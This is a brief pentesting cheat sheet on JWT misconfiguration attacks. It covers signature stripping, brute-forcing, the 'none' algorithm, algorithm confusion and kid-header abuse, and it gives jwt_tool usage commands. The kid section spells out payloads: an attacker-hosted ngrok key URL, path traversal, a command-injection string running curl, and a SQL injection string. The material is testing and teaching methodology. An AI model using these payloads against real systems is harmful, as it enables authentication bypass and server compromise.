# JWT Misconfiguration
1. Signature not checked? &rarr; Modify the body,
2. Signature checked only if it exists? &rarr; Modify the body and delete signature.
3. Weak signature &rarr; Bruteforcing signature.
4. None Algorithm attack (Change algorithm to None/none/nONE/NONE).
5. Application uses RS256 algorithm? &rarr; Look for public key using recon. Change the algorithm to HS256 and generate new token using public key.
6. Vulnerable Kid: The kid (key ID) is a hint indicating which key was used to secure the JWS (JSON Web Signature). It's generally used when there are multiple keys to sign the tokens and we need to look up the right one to verify the signature.

```
6.1. Change kid url to your url so that the application use your key to verify the modified JWT token.
ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub

"kid":"http://localhost/key.pem" --> "kid":"http://xyz.ngrok.io/jwtRS256.key"

6.2. Try publicly accesible files to verify the token.
"kid":"app/secret.pem" --> "kid":"../../public/main.css"

6.3. Command Injection:
"kid":"app/secret.pem && curl http://bing.com &"

6.4. SQLi:

"kid":"hello UNION SELECT 'key';--"
```

### Automation:
* git clone https://github.com/ticarpi/jwt_tool
* cd jwt_tool
* pip3 install -r requirements.txt
* python3 jwt_tool.py -M at -t "https://api.example.com/api/v1/profile" -rh "Authorization: Bearer ```<JWT Token>```"

Reference:
- https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
- https://github.com/KathanP19/HowToHunt/blob/master/JWT/JWT.md
